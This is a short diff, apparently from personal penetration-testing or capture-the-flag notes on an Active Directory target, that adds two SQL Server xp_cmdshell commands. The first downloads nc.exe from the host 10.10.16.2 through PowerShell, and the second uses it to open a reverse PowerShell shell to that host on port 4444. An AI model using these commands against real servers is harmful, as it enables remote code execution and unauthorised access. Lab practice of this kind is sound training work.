@@ -460,4 +460,6 @@ Get-ADGroup -Identity 'Key Admins' -Properties *:
 
 ![[Pasted image 20240718213845.png]]
 
-RECONFIGURE
+xp_cmdshell "echo IWR http://10.10.16.2/nc.exe -Outfile %TEMP%\nc.exe | powershell -noprofile"
+
+xp_cmdshell "%TEMP%\nc.exe 10.10.16.2 4444 -e powershell.exe"
